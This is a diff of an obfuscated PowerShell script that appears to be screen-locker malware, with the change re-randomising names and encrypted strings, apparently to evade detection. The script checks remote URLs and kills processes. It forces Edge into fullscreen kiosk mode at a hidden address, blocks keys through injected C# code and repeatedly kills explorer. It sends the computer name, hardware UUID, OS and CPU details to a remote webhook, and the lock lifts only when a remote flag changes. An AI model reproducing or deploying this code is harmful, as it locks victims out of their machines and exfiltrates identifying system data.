@@ -2,7 +2,7 @@ $ErrorActionPreference = "Stop"
 
 Add-Type -AssemblyName System.Windows.Forms
 
-function ZroPvlNiogxD($title, $text, $duration) {
+function HvKUGnFaPhnK($title, $text, $duration) {
     $balloon = New-Object System.Windows.Forms.NotifyIcon
     $balloon.Icon = [System.Drawing.SystemIcons]::Warning
     $balloon.BalloonTipTitle = $title
@@ -13,7 +13,7 @@ function ZroPvlNiogxD($title, $text, $duration) {
     $balloon.Dispose()
 }
 
-function biyxvWqtVtoO($link, $title, $color, $fields) {
+function aLHanjHMqKQk($link, $title, $color, $fields) {
     $embedBody = @{
         embeds = @(
             @{
@@ -29,7 +29,7 @@ function biyxvWqtVtoO($link, $title, $color, $fields) {
     } catch {}
 }
 
-function OAVoILNHFNmq($reversed, $key) {
+function uDluPayfpcbz($reversed, $key) {
     $unreversed = -join ($reversed.ToCharArray() | Sort-Object { [array]::IndexOf($reversed.ToCharArray(), $_) } -Descending)
     $charArr = $reversed.ToCharArray()
     [array]::Reverse($charArr)
@@ -43,125 +43,129 @@ function OAVoILNHFNmq($reversed, $key) {
     return [System.Text.Encoding]::UTF8.GetString($result)
 }
 
-$GhsyHlKfrSNj = @("93cfad2b", "7b80b2d8", "8a937caf", "22afa0a9", "58c7ef92", "6a708895", "63c8abdb", "b06ede75", "53e2d902", "e59b3549", "3da082c1", "a897cda0", "14a80f8a", "26f153a6", "8628ca17", "cee23efe", "42a1a951", "d56e1b9d", "916275f1", "dd189386", "4be7ca32", "73d72663", "59aa5f6d", "8f544637", "7a5a90c3", "33d2bc80", "5306b73e", "ab50baa0", "5c9300e6", "8f11b16b", "e78c4934", "52e415fe", "cde318cb", "c4e5c2f2", "d7224ce4", "d293261c", "25fc707a", "d9adc2a6", "13499779", "23522bcf", "e86528a2", "6d8fbe76", "e6c62413", "84c29ad8", "9d58ee87", "30406ee3", "6086255e", "ab2e0a9e", "8186c7b9", "b1ca6021", "e66e1981", "44fed0c3", "3fd5fe6e", "b196a599", "32f10ede", "c565aef8", "5284e9ca", "d0fd40c1", "89c4ac9f", "0ec35d5e", "d8c9e00e", "b3869a7d", "38bf8b72", "dd70c572", "0150a32d", "25e36dc4", "e57f9887", "bd811758", "9a4e64b2", "5c32b537", "bc273474", "98ca827e", "616d3894", "f22b8080", "2327922b", "2a2980f9", "b1334d88", "ee0e009d", "9d45524d", "58ed2420", "6e0f5605", "69e98e69", "4b810fe6", "9a639017", "e8a215c1", "6b623b3f", "7d0a4e6d", "ea70c081", "de9875a5", "a3e1c0d6", "5fbe0247", "d3184d03")
-    $FOeJVmLyQojz = -join @($GhsyHlKfrSNj[64], $GhsyHlKfrSNj[88], $GhsyHlKfrSNj[21], $GhsyHlKfrSNj[54])
-    $pBXZqvyMbkCj = -join @($GhsyHlKfrSNj[85], $GhsyHlKfrSNj[78], $GhsyHlKfrSNj[84], $GhsyHlKfrSNj[39])
-    $qidJhZMyWFIR = -join @($GhsyHlKfrSNj[13], $GhsyHlKfrSNj[67], $GhsyHlKfrSNj[1], $GhsyHlKfrSNj[87])
-    $ltrJRDEudQtI = -join @($GhsyHlKfrSNj[82], $GhsyHlKfrSNj[17], $GhsyHlKfrSNj[25], $GhsyHlKfrSNj[56])
-    $kyfRVwzLTnaI = -join @($GhsyHlKfrSNj[5], $GhsyHlKfrSNj[68], $GhsyHlKfrSNj[36], $GhsyHlKfrSNj[9])
-    $PIzALMduWpmQ = -join @($GhsyHlKfrSNj[48], $GhsyHlKfrSNj[33], $GhsyHlKfrSNj[49], $GhsyHlKfrSNj[20])
-    $WIaqdNbFLVNY = -join @($GhsyHlKfrSNj[50], $GhsyHlKfrSNj[73], $GhsyHlKfrSNj[15], $GhsyHlKfrSNj[72])
-    $lbuQQEYZKevX = -join @($GhsyHlKfrSNj[83], $GhsyHlKfrSNj[77], $GhsyHlKfrSNj[81], $GhsyHlKfrSNj[24])
-    $GUdzFNrYkgiS = -join @($GhsyHlKfrSNj[2], $GhsyHlKfrSNj[10], $GhsyHlKfrSNj[40], $GhsyHlKfrSNj[70])
-    $KLpmwUtAAQcn = -join @($GhsyHlKfrSNj[90], $GhsyHlKfrSNj[62], $GhsyHlKfrSNj[55], $GhsyHlKfrSNj[57])
-    $pCQVxaIsZEWB = -join @($GhsyHlKfrSNj[11], $GhsyHlKfrSNj[32], $GhsyHlKfrSNj[89], $GhsyHlKfrSNj[44])
-    $FpRvosYjSSZI = -join @($GhsyHlKfrSNj[7], $GhsyHlKfrSNj[60], $GhsyHlKfrSNj[23], $GhsyHlKfrSNj[71])
-    $VfefGUeYVmnF = -join @($GhsyHlKfrSNj[75], $GhsyHlKfrSNj[46], $GhsyHlKfrSNj[59], $GhsyHlKfrSNj[76])
-    $mQjAhXNRjqva = -join @($GhsyHlKfrSNj[28], $GhsyHlKfrSNj[16], $GhsyHlKfrSNj[91], $GhsyHlKfrSNj[37])
-    $YovRfYvPRsph = -join @($GhsyHlKfrSNj[18], $GhsyHlKfrSNj[12], $GhsyHlKfrSNj[0], $GhsyHlKfrSNj[6])
-    $JxltcngCrDuR = -join @($GhsyHlKfrSNj[45], $GhsyHlKfrSNj[14], $GhsyHlKfrSNj[30], $GhsyHlKfrSNj[19])
-    $yCHMmDqzEhzW = -join @($GhsyHlKfrSNj[86], $GhsyHlKfrSNj[29], $GhsyHlKfrSNj[3], $GhsyHlKfrSNj[51])
-    $UAWuGUqxUJBt = -join @($GhsyHlKfrSNj[42], $GhsyHlKfrSNj[74], $GhsyHlKfrSNj[65], $GhsyHlKfrSNj[35])
-    $KuElbDsuwdgu = -join @($GhsyHlKfrSNj[66], $GhsyHlKfrSNj[22], $GhsyHlKfrSNj[27], $GhsyHlKfrSNj[38])
-    $zXfKTdrOswJG = -join @($GhsyHlKfrSNj[41], $GhsyHlKfrSNj[80], $GhsyHlKfrSNj[61], $GhsyHlKfrSNj[26])
-    $YbyVlWWdEPzu = -join @($GhsyHlKfrSNj[4], $GhsyHlKfrSNj[43], $GhsyHlKfrSNj[63], $GhsyHlKfrSNj[34])
-    $cgKbLLTovQMm = -join @($GhsyHlKfrSNj[69], $GhsyHlKfrSNj[52], $GhsyHlKfrSNj[47], $GhsyHlKfrSNj[31])
-    $fZJFfcVsmTVu = -join @($GhsyHlKfrSNj[79], $GhsyHlKfrSNj[58], $GhsyHlKfrSNj[8], $GhsyHlKfrSNj[53])
+$XxmWIASGJShM = @("74a2a9dd", "2a540373", "8421cacb", "ac242781", "23de74d8", "7503588e", "28b47cd0", "3d538010", "91560ab7", "8f7b7952", "cfbd6448", "6357c4a0", "29b84081", "4a63dbe6", "10c8d1b1", "fd0ffef4", "d21ca6c3", "36931b66", "a1eb3110", "5bf363a7", "7742c186", "cd2e1cc5", "5738dcbc", "695a3296", "fdea57f7", "8e1dc07d", "134311d5", "ed6d9fdf", "0796f9f4", "a412e19f", "0e0ebb59", "d3969aa5", "8bb4b9a4", "86108c86", "d89cad72", "8d0fe514", "bffc086c", "13469312", "b752c244", "a92f68f4", "ad1d1124", "feef7390", "47b5c73c", "c9860fee", "6761b795", "0422f4cb", "3b0e3d85", "9b104735", "b32bbc16", "c7bf05cc", "648ef8a8", "24d686cf", "2f3c46a7", "f3a44d17", "140901b9", "ca133209", "8b848cbf", "10bb496f", "93af304f", "9df4834b", "b90a2b24", "fc690041", "632ffa3b", "da9913f8", "cf597b1b", "8222d71d", "13b4ccac", "775625c7", "aa850860", "2daf725c", "bd50ba48", "1865cc29", "bcb07438", "13f27b87", "1b237fd4", "7b84a514", "adbd04d6", "99cd9629", "520a9a26", "e048c8b8", "b4b0e061", "646615f5", "4927ed15", "09669406", "37cf5908", "116ee9e0", "e581f37c", "0bc869bc", "e6e90e65", "1ed10cf0", "99317767", "69eb73a0", "43c79da6", "0de9f87f", "7fcd7297", "eddf8c46", "2712d038", "1eb58897", "ff2652cd", "729ea1f5", "7a87e40b", "cd963bf6", "707c696c", "42774657")
+    $IwaJOBbvoBCV = -join @($XxmWIASGJShM[64], $XxmWIASGJShM[44], $XxmWIASGJShM[61], $XxmWIASGJShM[23])
+    $guGTdfxbGqIi = -join @($XxmWIASGJShM[0], $XxmWIASGJShM[86], $XxmWIASGJShM[33], $XxmWIASGJShM[58])
+    $FWhZrdPiStvn = -join @($XxmWIASGJShM[83], $XxmWIASGJShM[37], $XxmWIASGJShM[101], $XxmWIASGJShM[10])
+    $XGfRFFFrsECE = -join @($XxmWIASGJShM[42], $XxmWIASGJShM[43], $XxmWIASGJShM[93], $XxmWIASGJShM[40])
+    $gqxbvjQYRZVt = -join @($XxmWIASGJShM[3], $XxmWIASGJShM[26], $XxmWIASGJShM[65], $XxmWIASGJShM[71])
+    $jxwrwjaGLoTR = -join @($XxmWIASGJShM[51], $XxmWIASGJShM[54], $XxmWIASGJShM[103], $XxmWIASGJShM[11])
+    $JfRygCnfAeHp = -join @($XxmWIASGJShM[55], $XxmWIASGJShM[21], $XxmWIASGJShM[28], $XxmWIASGJShM[92])
+    $VTplXVaVtrZw = -join @($XxmWIASGJShM[17], $XxmWIASGJShM[4], $XxmWIASGJShM[78], $XxmWIASGJShM[87])
+    $cHpcAGBbetnI = -join @($XxmWIASGJShM[95], $XxmWIASGJShM[63], $XxmWIASGJShM[12], $XxmWIASGJShM[53])
+    $FKcoiQtaIVNB = -join @($XxmWIASGJShM[32], $XxmWIASGJShM[102], $XxmWIASGJShM[77], $XxmWIASGJShM[35])
+    $aXRGWUCNEVnt = -join @($XxmWIASGJShM[98], $XxmWIASGJShM[39], $XxmWIASGJShM[16], $XxmWIASGJShM[34])
+    $CZkDPzeOWRGe = -join @($XxmWIASGJShM[88], $XxmWIASGJShM[75], $XxmWIASGJShM[79], $XxmWIASGJShM[30])
+    $cYwWxwlWCWmR = -join @($XxmWIASGJShM[99], $XxmWIASGJShM[2], $XxmWIASGJShM[49], $XxmWIASGJShM[56])
+    $cBfSfNJbmnwU = -join @($XxmWIASGJShM[96], $XxmWIASGJShM[29], $XxmWIASGJShM[7], $XxmWIASGJShM[84])
+    $isXDJUPBEekp = -join @($XxmWIASGJShM[1], $XxmWIASGJShM[94], $XxmWIASGJShM[76], $XxmWIASGJShM[89])
+    $PRqGosbsqKIk = -join @($XxmWIASGJShM[72], $XxmWIASGJShM[100], $XxmWIASGJShM[38], $XxmWIASGJShM[70])
+    $ZlHRYTOzdKlx = -join @($XxmWIASGJShM[62], $XxmWIASGJShM[68], $XxmWIASGJShM[41], $XxmWIASGJShM[82])
+    $ylwgusmPsEdb = -join @($XxmWIASGJShM[52], $XxmWIASGJShM[50], $XxmWIASGJShM[31], $XxmWIASGJShM[6])
+    $rDTLhTzJoezl = -join @($XxmWIASGJShM[27], $XxmWIASGJShM[48], $XxmWIASGJShM[46], $XxmWIASGJShM[57])
+    $xUxkMUUoZoDz = -join @($XxmWIASGJShM[9], $XxmWIASGJShM[14], $XxmWIASGJShM[60], $XxmWIASGJShM[20])
+    $YQtSkoeWXIDu = -join @($XxmWIASGJShM[74], $XxmWIASGJShM[8], $XxmWIASGJShM[15], $XxmWIASGJShM[45])
+    $srDJAIqYmthC = -join @($XxmWIASGJShM[24], $XxmWIASGJShM[19], $XxmWIASGJShM[36], $XxmWIASGJShM[90])
+    $rxpUPMtYfjHs = -join @($XxmWIASGJShM[25], $XxmWIASGJShM[69], $XxmWIASGJShM[80], $XxmWIASGJShM[81])
+    $cMjdGEvIredN = -join @($XxmWIASGJShM[73], $XxmWIASGJShM[59], $XxmWIASGJShM[91], $XxmWIASGJShM[22])
+    $eRpHFZEAJvQG = -join @($XxmWIASGJShM[67], $XxmWIASGJShM[5], $XxmWIASGJShM[66], $XxmWIASGJShM[13])
+    $ebDFHmGXNjfc = -join @($XxmWIASGJShM[85], $XxmWIASGJShM[18], $XxmWIASGJShM[47], $XxmWIASGJShM[97])
 
-$rjWzWPizERoO = "BEQCE01VYNlVZxlWcxVGfh1BdM1WUoVRfBEBTsUHJIBQBVEW"
-$YOjjEsZmieDV = "==gZ1lSDjRUJBBxUbpnZGBWSTdlXBIVdspyBXwjWUFgAx9FWpYFV5ZRfGUFRDYkXjVRa8sAUcJEYzMlKWByZLJEWYxlDR5BBVpAUWZwBBYgBVlgXAAVBFIwUZUBCN0lWXZVReoQRQ1BDXZgSQBkWWdUDdlEHYBkQCZhX"
-$OhddOJLQqCyT = "==wFD5VDOsVBeByHWtgVVphVeMUXU8wV1oVQfdSGf51WechXSVxCXdAQHMUTAIEUB5lVf8UBQkhTJYUQSIkW"
-$itGQbYIffsCi = "==QQARUWXETHKolUJYxAecxUFlwVx8ARflXTZ5AAXEhWdZ0WftVEHEUERZEDNtgVLFEVWkhScNUQMZBX"
-$XXkwAVBqlmyT = "=gWEQw1RK0wRIJVQGlBEWBxWVZRXlsRFVoRXGZ1EUtBFZExALBVFOUBEbE0AY1FQKcFFFhxQBp1XdpUWRNUb"
-$jcyCYMcYsTkc = "==gEPwgXWERUCJhSMhgFAJkVDYUEUFxRDp0AfNERdJUb"
-$qdoSTmucPVku = "XdVEEYAWbBRQOA1WVI0VJFxFTVEM"
-$ChiIVhqOkEMW = "A0FBrcRQf1EWFRQf"
-$mCIEYumYklTs = "==wdwZDc"
-$WAWDcFpfQfWC = "Z1QUVARXldxRF9VAM8gY"
-$yfEuKGvbeyjH = "shmI"
-$ONcFoweLQJTV = "XxQUXckUzQEARR1J"
-$akLVPTkPolqV = "==gRElFRllBCfFlSBRQY"
-$YSRJGYISUHaO = "=kUEwFkVaNkCCdlVLxwc"
-$prcwDSsrbIBQ = "==wVbhVb"
-$FTSuKYRjDOgz = "==QAA01UbxVc"
-$LPXqGBVZsRgk = "==QRNplFBREAOAEFU5gQHYUBXZUEf1VCSBlCaR0UXUVQFtgb"
-$GYkcgSSDAASA = "RdlFTxFUaBkVmNxXbtVRQMlN"
-$cypJfoEYlRaS = "==QGWdFUVQEUWkhWWFEXUQ1XZVwDnAxGGQAEVNQQEUQGbhVUMhlCYx1M"
-$MIhChwyBkoUC = "=kRBcJUXfJBWfVVFfQFBTR0WEI0CZxxc"
-$vQFIDVUboMwq = "DIwUGsEW"
-$owthOntRSEmK = "==wALJVHQVgVWBBW"
-$dEsnkfhpNPvt = "RtBXWI0VG1FCVAEU"
+$KdQDnBUYacdg = "IEgXX5gCPAlBKc1Xe51HdZVVNJwWMhFEW9kVB1kHYRUSBJxC"
+$YsAGnsQkIrEs = "==QbyJ3WqZUdP1EVYtXNCxGGPUVCaBQd7wnBXsGCVVlVxR1XyBQX7Z0cbJ1RCUhWvRUN+w1COI0NlJlKBInZfYBWTtVVHchBFQQDRVgBSJgCEUFXXtwVFUVBYUxXfxlDDYlTZE1EZ9BXZtVTTFUCStEXBs0SDIhQVA0X"
+$IOhyBFQSOYWA = "==gQXsgCIU1BOEXGX1gAf5hUWQUUDx1Vk1VTYdnFdd1VaIkCHIRDZVAEWVETGYhWFplXYMkUDlxHOokRC1EW"
+$RsUchTLegKMG = "==wFUIhVMVjFL0QUIo0BfQUXJ5gAn51FbNCGZtVUfUkCUBxDJQlSDoEEGUUDR8wVY8EWRwEHNARRWMEX"
+$lFGyOFTwGkZf = "=4TQNllXUZBWRZkEeAhSQZhXdNETWNREUUxVCNVEDshEPFUUEdlUXg1cGJhHQ0FWLMUWQZxEdMRWFdFRdFkO"
+$eDAczlyOfFIw = "==AQaxgXGB0UEVBTO5lQDRRXHUkQYR0RRUhAehBRBc0Z"
+$UsYLZfxWJREL = "CMVTWVVXAMESJAVDQo0XCNRQUJhN"
+$wYlbEAFMNzCc = "AkgU8ZhRNUEWKN1d"
+$wPcfWRAcAMGB = "==gItMTL"
+$CGwfOuyRppfz = "YZ1XQUUVhRhEO1AUMswb"
+$YxjKSegigWEc = "nZTJ"
+$etThDESFRjgz = "ad1CEd0UzABXCIFI"
+$LuMkWdeTxBnx = "==wFDNFQrVBCehgFKdFZ"
+$CwCNXFJbIKFA = "=EUFzFBUP0EXCNwVDhFd"
+$RqckNcfNyeEX = "==QUYhgZ"
+$kFFLzsQGBmzp = "==wVRx1UN8AI"
+$TeGhmCJBJxNZ = "==gEMxFRVUkUa1EFdZVQRZUAAIxQfR1WWlVDDIkVTcgRHx1b"
+$sIRxHtBpJyWT = "XFATAY1DIoUUidxDZ1FEANQY"
+$NWmVvSZZJBfO = "==ASKkAUXUUAWY0WYx0BCd1XcxlC2VkHGYlQSZgFHY1EMkQDSgFCZ1wM"
+$EguEmUdyFcMm = "=whBXVRVVJBXNIFRBdQUUBUWYdxDW5Rf"
+$kjynxiORDkRo = "DA1VXFBX"
+$PycSISMHdSud = "==wBNJFSSJVBAcxC"
+$oJeVeHsJcegD = "DkRAcYhUCxACB1RX"
+$xtnRVkrgABoB = "YI1BGZFTaNxCalVXCVUXUEEd"
+$ehuJfeTvbcHf = "ZhlCBJ0UW9kc"
+$xqkDLEkSDzPz = "==AVCE1Ft5gBXVkY"
 
 try {
-    $AzpyOdCisGiD = OAVoILNHFNmq $rjWzWPizERoO $FOeJVmLyQojz
-    $CKarEVYHkQpM = OAVoILNHFNmq $YOjjEsZmieDV $pBXZqvyMbkCj
-    $WJjApzsUgbuz = OAVoILNHFNmq $OhddOJLQqCyT $qidJhZMyWFIR
-    $iVAShskGAyRL = OAVoILNHFNmq $itGQbYIffsCi $ltrJRDEudQtI
-    $iCmNauZihpfi = OAVoILNHFNmq $XXkwAVBqlmyT $kyfRVwzLTnaI
-    $EmBDrFrQYfiE = OAVoILNHFNmq $jcyCYMcYsTkc $PIzALMduWpmQ
-    $tqBcUibWVYVD = OAVoILNHFNmq $qdoSTmucPVku $WIaqdNbFLVNY
-    $gttXndOSRiqJ = OAVoILNHFNmq $ChiIVhqOkEMW $lbuQQEYZKevX
-    $BLZSEHsQxDLA = OAVoILNHFNmq $mCIEYumYklTs $GUdzFNrYkgiS
-    $bTXTZIShjALP = OAVoILNHFNmq $WAWDcFpfQfWC $KLpmwUtAAQcn
-    $dZcdveAQLbhX = OAVoILNHFNmq $yfEuKGvbeyjH $pCQVxaIsZEWB
-    $VoXXrmlduFQp = OAVoILNHFNmq $ONcFoweLQJTV $FpRvosYjSSZI
-    $AFvqsOTTwwuP = OAVoILNHFNmq $akLVPTkPolqV $VfefGUeYVmnF
-    $LXyjidnPWgDn = OAVoILNHFNmq $YSRJGYISUHaO $mQjAhXNRjqva
-    $gXNiaSFPLaUm = OAVoILNHFNmq $prcwDSsrbIBQ $YovRfYvPRsph
-    $DRqxjzfmGldQ = OAVoILNHFNmq $FTSuKYRjDOgz $JxltcngCrDuR
-    $fQIKlchWOqxD = OAVoILNHFNmq $LPXqGBVZsRgk $yCHMmDqzEhzW
-    $HbxpDdxfWHOG = OAVoILNHFNmq $GYkcgSSDAASA $UAWuGUqxUJBt
-    $MFGLNOXoheGX = OAVoILNHFNmq $cypJfoEYlRaS $KuElbDsuwdgu
-    $nhNePBnJUFzY = OAVoILNHFNmq $MIhChwyBkoUC $zXfKTdrOswJG
-    $dIXfWxHHZNFO = OAVoILNHFNmq $vQFIDVUboMwq $YbyVlWWdEPzu
-    $igNjnKUgrLae = OAVoILNHFNmq $owthOntRSEmK $cgKbLLTovQMm
-    $bMZoAxaoOZjA = OAVoILNHFNmq $dEsnkfhpNPvt $fZJFfcVsmTVu
-    $iCmNauZihpfi = $iCmNauZihpfi | ConvertFrom-Json
+    $bRdNlQlvNWXj = uDluPayfpcbz $KdQDnBUYacdg $IwaJOBbvoBCV
+    $UQWMgXxemlyG = uDluPayfpcbz $YsAGnsQkIrEs $guGTdfxbGqIi
+    $kIjamoOtShZF = uDluPayfpcbz $IOhyBFQSOYWA $FWhZrdPiStvn
+    $GWURVXPVrRQV = uDluPayfpcbz $RsUchTLegKMG $XGfRFFFrsECE
+    $cfJzaoshAVrJ = uDluPayfpcbz $lFGyOFTwGkZf $gqxbvjQYRZVt
+    $BziKbicDvsWb = uDluPayfpcbz $eDAczlyOfFIw $jxwrwjaGLoTR
+    $TnaYxRcrTKTT = uDluPayfpcbz $UsYLZfxWJREL $JfRygCnfAeHp
+    $bSRJrHFSUQnG = uDluPayfpcbz $wYlbEAFMNzCc $VTplXVaVtrZw
+    $oanqaErbDQlA = uDluPayfpcbz $wPcfWRAcAMGB $cHpcAGBbetnI
+    $ygZlsxwbvOSh = uDluPayfpcbz $CGwfOuyRppfz $FKcoiQtaIVNB
+    $FHqYKiIElutq = uDluPayfpcbz $YxjKSegigWEc $aXRGWUCNEVnt
+    $VeZGgnkDGmXn = uDluPayfpcbz $etThDESFRjgz $CZkDPzeOWRGe
+    $VwbPRbtUxCPd = uDluPayfpcbz $LuMkWdeTxBnx $cYwWxwlWCWmR
+    $HuQjNVGmyprL = uDluPayfpcbz $CwCNXFJbIKFA $cBfSfNJbmnwU
+    $EinvamEiLouP = uDluPayfpcbz $RqckNcfNyeEX $isXDJUPBEekp
+    $vTnQUMbIfztB = uDluPayfpcbz $kFFLzsQGBmzp $PRqGosbsqKIk
+    $BRQySSMdxDUo = uDluPayfpcbz $TeGhmCJBJxNZ $ZlHRYTOzdKlx
+    $FFQddZmoISHI = uDluPayfpcbz $sIRxHtBpJyWT $ylwgusmPsEdb
+    $UrWVwlSYDYEY = uDluPayfpcbz $NWmVvSZZJBfO $rDTLhTzJoezl
+    $zqrdhOLFWRkh = uDluPayfpcbz $EguEmUdyFcMm $xUxkMUUoZoDz
+    $UviZWCQvDaRe = uDluPayfpcbz $kjynxiORDkRo $YQtSkoeWXIDu
+    $RxzNGTYLErWV = uDluPayfpcbz $PycSISMHdSud $srDJAIqYmthC
+    $fCXuNEzuRGPa = uDluPayfpcbz $oJeVeHsJcegD $rxpUPMtYfjHs
+    $yOCgaZTHJoPB = uDluPayfpcbz $xtnRVkrgABoB $cMjdGEvIredN
+    $yGlAdCMmNSCq = uDluPayfpcbz $ehuJfeTvbcHf $eRpHFZEAJvQG
+    $kdMyChVFwzkz = uDluPayfpcbz $xqkDLEkSDzPz $ebDFHmGXNjfc
+    $cfJzaoshAVrJ = $cfJzaoshAVrJ | ConvertFrom-Json
 } catch { exit 1 }
 
 
-$zfiYqKTaEXAi = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
 try {
-    $uvGXyTisOmyB = (Invoke-WebRequest -Uri $WJjApzsUgbuz -UseBasicParsing -ErrorAction Stop).Content
+$ENdYBIkQBpqN = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
+try {
+    $oyXxilFhWnOl = (Invoke-WebRequest -Uri $kIjamoOtShZF -UseBasicParsing -ErrorAction Stop).Content
 } catch { exit 1 }
 
-if ($uvGXyTisOmyB -match $zfiYqKTaEXAi) {
-    ZroPvlNiogxD $DRqxjzfmGldQ $fQIKlchWOqxD 10
+if ($oyXxilFhWnOl -match $ENdYBIkQBpqN) {
+    HvKUGnFaPhnK $vTnQUMbIfztB $BRQySSMdxDUo 10
     exit 0
 }
 
 try {
-    $DDkFcAPBNBwH = (Invoke-WebRequest -Uri $iVAShskGAyRL -UseBasicParsing -ErrorAction Stop).Content.Trim().ToLower()
+    $DHvffUvZaNnU = (Invoke-WebRequest -Uri $GWURVXPVrRQV -UseBasicParsing -ErrorAction Stop).Content.Trim().ToLower()
 } catch { exit 1 }
 
-if ($DDkFcAPBNBwH -eq "true") {
-    Write-Host $nhNePBnJUFzY
+if ($DHvffUvZaNnU -eq "true") {
+    Write-Host $zqrdhOLFWRkh
     exit 0
 }
 
-foreach ($bnOVizJrZzmt in $iCmNauZihpfi) {
-    $JGQKpEmyBsHS = $bnOVizJrZzmt -replace "\.exe`$",""
-    if (Get-Process -Name $JGQKpEmyBsHS -ErrorAction SilentlyContinue) {
-        if ($bnOVizJrZzmt -notmatch "\.exe`$") {
-            $bnOVizJrZzmt = "$bnOVizJrZzmt.exe"
+foreach ($NswoJuTwszHt in $cfJzaoshAVrJ) {
+    $yrOOsmNWoetf = $NswoJuTwszHt -replace "\.exe`$",""
+    if (Get-Process -Name $yrOOsmNWoetf -ErrorAction SilentlyContinue) {
+        if ($NswoJuTwszHt -notmatch "\.exe`$") {
+            $NswoJuTwszHt = "$NswoJuTwszHt.exe"
         }
         try {
-            taskkill /F /IM $bnOVizJrZzmt /T 2>&1 | Out-Null
+            taskkill /F /IM $NswoJuTwszHt /T 2>&1 | Out-Null
         } catch {}
     }
 }
 
-if (Get-Process -Name "explorer" -ErrorAction SilentlyContinue) {
-    try {
-        taskkill /F /IM $bMZoAxaoOZjA /T 2>&1 | Out-Null
-    } catch {}
-}
-
-Start-Process $igNjnKUgrLae "--kiosk `"$AzpyOdCisGiD`" --edge-kiosk-type=fullscreen --no-first-run"
+Start-Process $RxzNGTYLErWV "--kiosk `"$bRdNlQlvNWXj`" --edge-kiosk-type=fullscreen --no-first-run"
 
 Start-Sleep -Seconds 3
 
-$bBLBTbgvYaAy = @"
+$iavNshronSTp = @"
 using System;
 using System.Runtime.InteropServices;
 public class KeyBlock {
@@ -205,87 +209,107 @@ public class KeyBlock {
 "@
 
 try {
-    Add-Type -TypeDefinition $bBLBTbgvYaAy -ErrorAction Stop
+    Add-Type -TypeDefinition $iavNshronSTp -ErrorAction Stop
 } catch { }
 
 [KeyBlock]::BlockKeys()
 
-$puDGuXAteEWI = $env:COMPUTERNAME
-$aBAEFecBRMXo = (Get-CimInstance -Class Win32_OperatingSystem).Caption
-$czqPNhWBpOcq = (Get-CimInstance -Class Win32_Processor).Name
-$wMtlplOHFWWm = (Get-Item "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
-if (-not $wMtlplOHFWWm) {
-    $wMtlplOHFWWm = (Get-Item "C:\Program Files\Microsoft\Edge\Application\msedge.exe" -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
+$HznaGyHawCLN = $env:COMPUTERNAME
+$wPySQlNVIWRH = (Get-CimInstance -Class Win32_OperatingSystem).Caption
+$PobpbouLkUBB = (Get-CimInstance -Class Win32_Processor).Name
+$uQeInEtKwNEt = (Get-Item "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
+if (-not $uQeInEtKwNEt) {
+    $uQeInEtKwNEt = (Get-Item "C:\Program Files\Microsoft\Edge\Application\msedge.exe" -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
 }
-if (-not $wMtlplOHFWWm) { $wMtlplOHFWWm = "Unknown" }
-$STxqUCAQAktD = Get-Date -Format "HH:mm:ss | dd/MM/yyyy"
+if (-not $uQeInEtKwNEt) { $uQeInEtKwNEt = "Unknown" }
+$PEsqjNfDQXHE = Get-Date -Format "HH:mm:ss | dd/MM/yyyy"
 
-$bDQfePCJTasT = @(
-    @{ name = $gttXndOSRiqJ; value = $puDGuXAteEWI; inline = $true }
-    @{ name = $BLZSEHsQxDLA; value = $zfiYqKTaEXAi; inline = $true }
-    @{ name = $bTXTZIShjALP; value = $aBAEFecBRMXo; inline = $false }
-    @{ name = $dZcdveAQLbhX; value = $czqPNhWBpOcq; inline = $false }
-    @{ name = $VoXXrmlduFQp; value = $wMtlplOHFWWm; inline = $true }
-    @{ name = $AFvqsOTTwwuP; value = $STxqUCAQAktD; inline = $true }
+$HmHvlXdJmBqR = @(
+    @{ name = $bSRJrHFSUQnG; value = $HznaGyHawCLN; inline = $true }
+    @{ name = $oanqaErbDQlA; value = $ENdYBIkQBpqN; inline = $true }
+    @{ name = $ygZlsxwbvOSh; value = $wPySQlNVIWRH; inline = $false }
+    @{ name = $FHqYKiIElutq; value = $PobpbouLkUBB; inline = $false }
+    @{ name = $VeZGgnkDGmXn; value = $uQeInEtKwNEt; inline = $true }
+    @{ name = $VwbPRbtUxCPd; value = $PEsqjNfDQXHE; inline = $true }
 )
-biyxvWqtVtoO $CKarEVYHkQpM $EmBDrFrQYfiE 3066993 $bDQfePCJTasT
+aLHanjHMqKQk $UQWMgXxemlyG $BziKbicDvsWb 3066993 $HmHvlXdJmBqR
 
-$global:dLlVGlbTwybM = $true
+$global:RuazsEAOTKIR = $true
 
-$jeJCpwyOVcHI = Start-Job -ScriptBlock {
+$NfSmBUdjkjQS = Start-Job -ScriptBlock {
     param($url)
     while ($true) {
         try {
-            $UunmKxMLYgSH = (Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop).Content.Trim().ToLower()
-            if ($UunmKxMLYgSH -eq "true") {
+            $ddhqXkVJlyFn = (Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop).Content.Trim().ToLower()
+            if ($ddhqXkVJlyFn -eq "true") {
                 return "completed"
             }
         } catch {}
         Start-Sleep -Seconds 20
     }
-} -ArgumentList $iVAShskGAyRL
+} -ArgumentList $GWURVXPVrRQV
 
-while ($global:dLlVGlbTwybM) {
-    if ($jeJCpwyOVcHI.State -eq "Completed") {
-        $condition = Receive-Job -Job $jeJCpwyOVcHI
+while ($global:RuazsEAOTKIR) {
+    for ($i = 0; $i -lt 50; $i++) {
+        [System.Windows.Forms.Application]::DoEvents()
+        Start-Sleep -Milliseconds 10
+    }
+
+    if (Get-Process -Name "explorer" -ErrorAction SilentlyContinue) {
+        try {
+            taskkill /F /IM $fCXuNEzuRGPa /T 2>&1 | Out-Null
+        } catch {}
+    }
+
+    if ($NfSmBUdjkjQS.State -eq "Completed") {
+        $condition = Receive-Job -Job $NfSmBUdjkjQS
         if ($condition -eq "completed") {
             [KeyBlock]::UnblockKeys()
-            taskkill /F /IM $igNjnKUgrLae /T 2>&1 | Out-Null
-            Start-Process $bMZoAxaoOZjA
-            $global:dLlVGlbTwybM = $false
+            taskkill /F /IM $RxzNGTYLErWV /T 2>&1 | Out-Null
+            Start-Process $fCXuNEzuRGPa
+            $global:RuazsEAOTKIR = $false
             break
         }
     }
 
